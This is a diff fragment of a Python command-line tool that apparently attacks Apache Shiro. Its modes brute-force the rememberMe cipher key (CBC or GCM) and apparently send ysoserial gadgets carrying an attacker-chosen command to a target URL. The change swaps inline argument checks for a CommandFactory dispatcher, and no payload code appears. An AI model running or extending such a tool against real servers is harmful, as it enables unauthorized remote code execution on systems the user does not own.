+    gadget  = args.gadget
+    command = args.command
+    proxies = args.proxies
 
-    if mode not in ['brute', 'yso', 'echo', 'encode']:
-        print("[!] Please check the mode,it must be brute/yso/echo/encode")
-        exit()
-
-    if url == None:
-        print("[!] Please specify the target URL!")
-        exit()
-
-    if type!= None and type not in ['GCM', 'CBC']:
-        print("[!] Please check the type,it must be GCM or CBC")
-        exit()
-
-    if mode == "brute" and type == "CBC":
-        print("[*] your mode : {0}".format(mode))
-        print("[*] Your url url : {0}".format(url))
-        print("[*] Your Cipher type : {0}".format(type))
-        if brute_key(url, type, key,data=None) == False:
-            print("[!] The current chiper type is CBC,maybe you can add the '- t GCM' argument and run again")
-            exit()
-
-    if mode == "brute" and type == "GCM":
-        print("[*] your mode : {0}".format(mode))
-        print("[*] Your url url : {0}".format(url))
-        print("[*] Your Cipher type : {0}".format(type))
-        if brute_key(url, type, key,data=None) == False:
-            print("[!] The current chiper type is GCM,maybe you can add the '- t CBC' argument and run again")
-            exit()
-
-    # if mode == "brute" and key != None:
-    #     print("[*] Start checking the shiro key : {}".format(key))
+    cmd = CommandFactory(mode, url, type, key, data, proxies, command, gadget)
+    cmd.run()
